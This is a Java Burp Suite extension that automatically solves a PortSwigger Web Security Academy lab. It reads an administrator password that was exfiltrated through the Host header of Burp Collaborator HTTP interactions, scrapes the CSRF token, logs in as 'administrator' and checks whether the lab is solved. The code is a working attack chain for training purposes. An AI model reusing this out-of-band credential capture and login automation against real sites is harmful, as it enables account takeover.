package labSolver;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.http.message.requests.HttpRequest;

import labSolver.poller.InteractionHandler;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.CookieHandler;
import java.net.CookieManager;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MyInteractionHandler implements InteractionHandler {
    private final MontoyaApi api;
    private final InteractionLogger interactionLogger;
    private final String labUrl;
    private String csrfToken;
    private String password;
    private final String username = "administrator";

    public MyInteractionHandler(MontoyaApi api, InteractionLogger interactionLogger) {
        this.api = api;
        this.interactionLogger = interactionLogger;
        this.labUrl = "https://0ab3007f04c68b68848ba04100e10057.web-security-academy.net/";
        CookieHandler.setDefault(new CookieManager());
    }

    @Override
    public void handleInteraction(Interaction interaction) {
        if (interaction.type().name().equalsIgnoreCase("http")) {
            interactionLogger.logInteraction(interaction);
            HttpRequest httpRequest = interaction.httpDetails().get().requestResponse().request();
            String hostHeader = httpRequest.headers().stream()
                    .filter(header -> header.name().equalsIgnoreCase("Host"))
                    .map(header -> header.value())
                    .findFirst()
                    .orElse("Host header not found");
            if (!hostHeader.equals("Host header not found")) {
                String password = hostHeader.split("\\.")[0];
                this.password = password;
                try {
                    this.csrfToken = getCsrfToken();
                    signInAsAdmin();
                    checkSolution();
                } catch (IOException e) {
                    e.printStackTrace();
                    api.logging().logToOutput("Error: " + e.getMessage());
                }
            }
        }
    }

    private String extractCsrfToken(String responseBody) {
        Pattern pattern = Pattern.compile("value=\"(.*?)\"");
        Matcher matcher = pattern.matcher(responseBody);
        if (matcher.find()) {
            return matcher.group(1);
        }
        return null;
    }

    private String getCsrfToken() throws IOException {
        URL url = new URL(labUrl + "login");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");

        StringBuilder response = new StringBuilder();
        try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
            String line;
            while ((line = in.readLine()) != null) {
                response.append(line);
            }
        }

        csrfToken = extractCsrfToken(response.toString());
        return csrfToken;
    }

    private void signInAsAdmin() throws IOException {
        String data = "csrf=" + csrfToken + "&username=" + username + "&password=" + password;
        URL url = new URL(labUrl + "login");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        connection.setRequestProperty("Content-Length", Integer.toString(data.length()));
        connection.setDoOutput(true);

        try (OutputStream os = connection.getOutputStream()) {
            os.write(data.getBytes());
            os.flush();
        }

        int responseCode = connection.getResponseCode();
        api.logging().logToOutput("Sign in as admin - Status Code: " + responseCode);
    }

    private void checkSolution() throws IOException {
        URL url = new URL(labUrl);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");

        StringBuilder response = new StringBuilder();
        try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
            String line;
            while ((line = in.readLine()) != null) {
                response.append(line);
            }
        }

        if (response.toString().contains("Congratulations, you solved the lab!")) {
            api.logging().logToOutput("You solved the lab.");
            api.logging().logToOutput("Coded by Mohamed Ahmed (ma4747gh).");
            api.logging().logToOutput("My GitHub account: https://github.com/ma4747gh");
            api.logging().logToOutput("My LinkedIn account: https://eg.linkedin.com/in/ma4747gh");
        }
    }
}
